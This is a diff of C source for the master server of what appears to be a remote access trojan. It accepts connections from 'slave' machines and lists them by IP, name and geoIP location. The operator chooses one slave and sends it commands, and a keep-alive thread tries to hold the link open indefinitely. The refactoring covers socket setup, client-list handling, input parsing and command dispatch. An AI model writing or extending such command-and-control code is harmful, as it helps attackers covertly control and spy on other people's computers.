@@ -1,34 +1,36 @@
 #include <stdio.h>
 #include <windows.h>
-#include "logger.h"
 #include "server.h"
-#include "SCL.h"
-#include "input.h"
-#include "types.h"
-#include "cmd/commands.h"
-#include "cmd/screen.h"
-#include "net/interface.h"
-#include "net/error.h"
 #include "whitelist.h"
 #include "blocklist.h"
+#include "logger.h"
+#include "types.h"
+#include "SCL2.h"
+#include "input.h"
+#include "net/dns.h"
+#include "net/error.h"
+#include "net/interface.h"
 #include "geoIP.h"
+#include "server/serv_cmds.h"
+#include "server/hdd/hdd.h"
 
-int server_ClientListSize = 0;
 int server_isSendingCmd = 0;
 int server_keepAliveRunning = 0;
 int server_isSendingKeepAlive = 0;
 int server_timeout = 1000;
 int server_Running = 0;
-int server_UsingPort = SERVER_PORT;
-uint64 server_io_block = 0;
-uint64 server_io_nonBlock = 1;
+int server_UsingPort = SERVER_DEF_PORT;
+ulong server_io_block = 0;
+ulong server_io_nonBlock = 1;
 SOCKET server_socket = INVALID_SOCKET;
 SOCKADDR_IN server_socketAddr;
 
 SOCKET server_Client = INVALID_SOCKET;
-SOCKET server_ClientList[SERVER_MAX_CLIENTS];
 SOCKADDR_IN server_ClientAddr;
-SOCKADDR_IN server_ClientAddrList[SERVER_MAX_CLIENTS];
+
+int server_clientListSize = 0;
+SOCKET server_clientList[SERVER_MAX_CLIENTS];
+SOCKADDR_IN server_clientAddrList[SERVER_MAX_CLIENTS];
 
 void server_closeAllUnused(void)
 {
@@ -36,19 +38,18 @@ void server_closeAllUnused(void)
 
 	for(id = 0; id != SERVER_MAX_CLIENTS; id++)
 	{
-		if(server_Client == server_ClientList[id])
+		if(server_Client == server_clientList[id])
 		{
 			continue;
 		}
 		
-		if(server_ClientList[id] != INVALID_SOCKET)
+		if(server_clientList[id] != INVALID_SOCKET)
 		{
-			shutdown(server_ClientList[id], SD_BOTH);
-			closesocket(server_ClientList[id]);
-			server_ClientList[id] = INVALID_SOCKET;
+			shutdown(server_clientList[id], SD_BOTH);
+			closesocket(server_clientList[id]);
+			server_clientList[id] = INVALID_SOCKET;
 		}
 	}
-	
 }
 
 void server_CloseConnection(void)
@@ -57,11 +58,11 @@ void server_CloseConnection(void)
 	
 	for(id = 0; id != SERVER_MAX_CLIENTS; id++)
 	{
-		if(server_ClientList[id] != INVALID_SOCKET)
+		if(server_clientList[id] != INVALID_SOCKET)
 		{
-			shutdown(server_ClientList[id], SD_BOTH);
-			closesocket(server_ClientList[id]);
-			server_ClientList[id] = INVALID_SOCKET;
+			shutdown(server_clientList[id], SD_BOTH);
+			closesocket(server_clientList[id]);
+			server_clientList[id] = INVALID_SOCKET;
 		}
 	}
 
@@ -72,11 +73,17 @@ void server_CloseConnection(void)
 		server_Client = INVALID_SOCKET;
 	}
 
+	if(!server_socket)
+	{
+		return;
+	}
+
 	shutdown(server_socket, SD_BOTH);
 	closesocket(server_socket);
 	server_socket = INVALID_SOCKET;
 	server_Running = 0;
 }
+
 
 int server_WsaInit(void)
 {
@@ -106,6 +113,7 @@ int server_Create(void)
 	setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR,(char*)&_val1, sizeof(_val1));
 	setsockopt(server_socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&server_timeout, sizeof(server_timeout));
 	setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, (char*)&_val1, sizeof(_val1));
+	net_SetBuffer(NET_BUFFSIZE);
 
 	server_socketAddr.sin_addr.s_addr = INADDR_ANY;
 	server_socketAddr.sin_family = AF_INET;
@@ -122,16 +130,16 @@ int server_Create(void)
 	
 	for(i = 0; i != SERVER_MAX_CLIENTS; i++)
 	{
-		server_ClientList[i] = INVALID_SOCKET;
+		server_clientList[i] = INVALID_SOCKET;
 	}
 
+	server_clientListSize = 0;
 	server_Client = INVALID_SOCKET;
-	server_ClientListSize = 0;
 
 	return SERVER_NO_ERROR;
 }
 
-int server_WaitForSlavesAndChoise(void)
+int server_WaitForSlaves(void)
 {
 	if(listen(server_socket, SOMAXCONN) != 0)
 	{
@@ -157,10 +165,13 @@ int server_WaitForSlavesAndChoise(void)
 	}
 
 	LOG(LOG_INFO, "Waiting for connection on port %d\n", server_UsingPort);
-	LOG(LOG_INFO, "Hold \"ESC\" to stop listening!\n");	
-	LOG(LOG_INFO, " Num  IP\n");
+	LOG(LOG_INFO, "Hold \"ESC\" to stop listening!\n");
+	LOG(LOG_NONE, "  Num  IP\n");
 
+	net_Ping = 0;
+	hdd_Reset();
 	int useSlaveID = -1;
+	LOG_TitleMaster();
 
 	while(1)
 	{
@@ -171,11 +182,13 @@ int server_WaitForSlavesAndChoise(void)
 
 		while((server_TempClient = accept(server_socket, (SOCKADDR*)&server_TempClientAddr, &_addrsize)) == INVALID_SOCKET)
 		{
-			if((GetKeyState(VK_ESCAPE) < 0))
+			Sleep(500);
+
+			if(input_IsKeyPressed(VK_ESCAPE))
 			{
 				while(1)
 				{
-					if(server_ClientListSize < 1)
+					if(server_clientListSize < 1)
 					{
 						ioctlsocket(server_socket, FIONBIO, &server_io_block);
 						server_CloseConnection();
@@ -183,14 +196,21 @@ int server_WaitForSlavesAndChoise(void)
 						return SERVER_ERROR_NO_SLAVE;
 					}
 
-					LOG(LOG_INFO, "Chose slave ID from 1 to %d (0 to stop):", server_ClientListSize);
+					LOG(LOG_INFO, "Chose slave ID from 1 to %d (0 to stop):", server_clientListSize);
 
-					char* cmdTodo = input_Get(INPUT_NONE);
-
-					useSlaveID = atoi(cmdTodo);
+					char* cmdTodo;
 					
-					free(cmdTodo);
+					int tig = input_Get(INPUT_TYPE_NONE, &cmdTodo);
 
+					if(tig)
+					{
+						useSlaveID = atoi(cmdTodo);
+						
+						free(cmdTodo);
+					}else{
+						useSlaveID = 0;
+					}
+					
 					if(useSlaveID - 1 < 0)
 					{
 						ioctlsocket(server_socket, FIONBIO, &server_io_block);
@@ -201,24 +221,24 @@ int server_WaitForSlavesAndChoise(void)
 
 					useSlaveID--;
 
-					if(useSlaveID >= 0 && useSlaveID <= server_ClientListSize)
+					if(useSlaveID >= 0 && useSlaveID <= server_clientListSize)
 					{
-						if(server_ClientList[useSlaveID] == INVALID_SOCKET)
+						if(server_clientList[useSlaveID] == INVALID_SOCKET)
 						{
 							LOG(LOG_ERR, "There is empty connection...\n");
 						}else{
 							char _val1[1] = { 1 };
-							server_Client = server_ClientList[useSlaveID];
-							server_ClientAddr = server_ClientAddrList[useSlaveID];
+							server_Client = server_clientList[useSlaveID];
+							server_ClientAddr = server_clientAddrList[useSlaveID];
 							
 							ioctlsocket(server_socket, FIONBIO, &server_io_block);
 							ioctlsocket(server_Client, FIONBIO, &server_io_block);
 							setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, _val1, sizeof(int));
 							setsockopt(server_Client, SOL_SOCKET, SO_RCVTIMEO, (char*)&server_timeout, sizeof(server_timeout));
-							screen_isUsingCompressor = 0;
+							//screen_isUsingCompressor = 0;
 							
-							LOG(LOG_SUCC, "Your slave is now %s\n", inet_ntoa(server_ClientAddr.sin_addr));							
-							SCL_ResetSeed();
+							LOG(LOG_WAR, "Your slave is now %s\n", inet_ntoa(server_ClientAddr.sin_addr));
+							SCL2_Reset();
 
 							server_closeAllUnused();
 
@@ -226,11 +246,13 @@ int server_WaitForSlavesAndChoise(void)
 						}
 					}else{
 						LOG(LOG_ERR, "Invalid id number!\n");
+
+						continue;
 					}
+
+					return SERVER_NO_ERROR;
 				}
 			}
-
-			Sleep(500);
 		}
 
 		if(server_TempClient != INVALID_SOCKET)
@@ -271,47 +293,27 @@ int server_WaitForSlavesAndChoise(void)
 			uint8* slaveName;
 			ioctlsocket(server_socket, FIONBIO, &server_io_block);
 			ioctlsocket(server_TempClient, FIONBIO, &server_io_block);
-			SCL_ResetSeed();
+			SCL2_Reset();
 
 			server_Client = server_TempClient;
 
 			sn_rv = net_ReceiveDataTimeout(&slaveName, SERVER_SLAVENAME_TIMER);
 			
-			if(sn_rv == NET_LOST_CONNECTION)
+			if(sn_rv > 0)
 			{
-				free(slaveName);
-			}else{
-				LOG(LOG_INFO, " ");
-
-				if(sn_rv == NET_TIMED_OUT)
+				LOG(LOG_NONE, "  ");
+				LOG_TablePrint(3, "%d", server_clientListSize + 1);
+				printf("  %s ", inet_ntoa(server_TempClientAddr.sin_addr));
+				
+				if(sn_rv == NET_ERROR_TIMEOUT)
 				{
-					if(server_ClientListSize + 1 > 99)
-					{
-						printf("%d  %s (", server_ClientListSize + 1, inet_ntoa(server_TempClientAddr.sin_addr));
-					}else if(server_ClientListSize + 1 > 9){
-						printf(" %d  %s (", server_ClientListSize + 1, inet_ntoa(server_TempClientAddr.sin_addr));
-					}else{
-						printf("  %d  %s (", server_ClientListSize + 1, inet_ntoa(server_TempClientAddr.sin_addr));
-					}
-
-					if(log_Color)
-					{
-						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
-						printf("UNKNOWN");
-						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
-						putchar(')');
-					}else{
-						printf("UNKNOWN)");
-					}
+					putchar('(');
+					LOG_SetColor(LOG_COLOR_ERR);
+					printf("UNKNOWN");
+					LOG_SetColor(LOG_COLOR_TEXT);
+					putchar(')');
 				}else{
-					if(server_ClientListSize + 1 > 99)
-					{
-						printf("%d  %s (%s)", server_ClientListSize + 1, inet_ntoa(server_TempClientAddr.sin_addr), slaveName);
-					}else if(server_ClientListSize + 1 > 9){
-						printf(" %d  %s (%s)", server_ClientListSize + 1, inet_ntoa(server_TempClientAddr.sin_addr), slaveName);
-					}else{
-						printf("  %d  %s (%s)", server_ClientListSize + 1, inet_ntoa(server_TempClientAddr.sin_addr), slaveName);
-					}
+					printf("(%s)", slaveName);
 				}
 	
 				if(geoIP_IsInUse)
@@ -322,15 +324,10 @@ int server_WaitForSlavesAndChoise(void)
 
 					if(geoIP_CheckIP(inet_ntoa(server_TempClientAddr.sin_addr), &geoName) != GEOIP_NO_ERROR)
 					{
-						if(log_Color)
-						{
-							LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
-							printf("UNKNOWN");
-							LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
-							putchar(')');
-						}else{
-							printf("UNKNOWN)");
-						}
+						LOG_SetColor(LOG_COLOR_ERR);
+						printf("UNKNOWN");
+						LOG_SetColor(LOG_COLOR_TEXT);
+						putchar(')');
 					}else{
 						printf("%s)", geoName);
 					}
@@ -338,17 +335,20 @@ int server_WaitForSlavesAndChoise(void)
 					free(geoName);
 				}
 
-				putchar('\n');
+				LOG_NEWLINE();
+				server_clientList[server_clientListSize] = server_TempClient;
+				server_clientAddrList[server_clientListSize++] = server_TempClientAddr;
+				free(slaveName);
 
-				server_ClientList[server_ClientListSize] = server_TempClient;
-				server_ClientAddrList[server_ClientListSize++] = server_TempClientAddr;
+				ioctlsocket(server_socket, FIONBIO, &server_io_nonBlock);
+				ioctlsocket(server_TempClient, FIONBIO, &server_io_nonBlock);
+				server_Client = INVALID_SOCKET;
+				
+				continue;
 			}
-			
-			free(slaveName);
 
-			ioctlsocket(server_socket, FIONBIO, &server_io_nonBlock);
-			ioctlsocket(server_TempClient, FIONBIO, &server_io_nonBlock);
-			server_Client = INVALID_SOCKET;
+			shutdown(server_TempClient, SD_BOTH);
+			closesocket(server_TempClient);
 		}
 	}
 
@@ -358,9 +358,8 @@ int server_WaitForSlavesAndChoise(void)
 }
 
 //keep-alive option is just 2 hours... not enough! i think this will keep alive the connection forever. i don't wanna test if it will work
-uint64 __stdcall server_thread_KeepAlive(void* args)
+ulong __stdcall server_thread_KeepAlive(void* args)
 {
-	int i;
 	server_keepAliveRunning = 1;
 	server_isSendingKeepAlive = 0;
 
@@ -368,11 +367,16 @@ uint64 __stdcall server_thread_KeepAlive(void* args)
 
 	while(server_Running)
 	{
+		if(!server_Running || !server_keepAliveRunning)
+		{
+			break;
+		}
+
 		server_isSendingKeepAlive = 1;
 
 		while(server_isSendingCmd){};
 		
-		if(net_CheckConnection() == NET_LOST_CONNECTION)
+		if(net_CheckConnection() < 1)
 		{
 			server_keepAliveRunning = 0;
 			server_isSendingKeepAlive = 0;
@@ -382,19 +386,7 @@ uint64 __stdcall server_thread_KeepAlive(void* args)
 		}
 
 		server_isSendingKeepAlive = 0;
-
-		//check every 500 ms to se if it the server is stopped; and after 1 minute check if the connection closed
-		for(i = 0; i != SERVER_KEEPALIVE_MAX; i++)
-		{
-			if(!server_Running || !server_keepAliveRunning)
-			{
-				server_keepAliveRunning = 0;
-
-				return 0;
-			}
-
-			Sleep(SERVER_KEEPALIVE_INTERVAL);
-		}
+		Sleep(SERVER_KEEPALIVE_INTERVAL);
 	}
 
 	server_keepAliveRunning = 0;
@@ -420,32 +412,41 @@ void server_ConnectionHandle(void)
 
 	while(server_Running)
 	{
-		in_msg = input_Get(INPUT_MASTER);
+		LOG_NEWLINE();
+
+		if(!input_Get(INPUT_TYPE_MASTER, &in_msg))
+		{
+			if(!server_Running)
+			{
+				LOG_NEWLINE();
+			}
+			continue;
+		}
 
 		server_isSendingCmd = 1;
 		while(server_isSendingKeepAlive){}; //wait is keepalive is sending
 		
-		if(net_CheckConnection() == NET_LOST_CONNECTION)
+		if(net_CheckConnection() < 1)
 		{
-			putchar('\n');
-			LOG(LOG_ERR, "%s lost connection!\n", inet_ntoa(server_ClientAddr.sin_addr));
+			LOG_NEWLINE();
+			LOG(LOG_WAR, "%s lost connection!\n", inet_ntoa(server_ClientAddr.sin_addr));
 			server_CloseConnection();
 			free(in_msg);
 
 			break;
 		}
 
-		rv = commands_Translate(in_msg);
+		rv = serv_cmds_Translate(in_msg, strlen(in_msg));
 
 		free(in_msg);
 
-		if(rv == NET_LOST_CONNECTION)
+		if(rv == SERV_CMDS_BREAK)
 		{
 			server_CloseConnection();
-
+			
 			break;
-		}else if(rv == COMMANDS_SUCC){ //ako e izpulnena komandata
-			SCL_SeedUp();
+		}else if(rv == SERV_CMDS_GOOD){
+			SCL2_SeedUp();
 		}
 
 		server_isSendingCmd = 0;
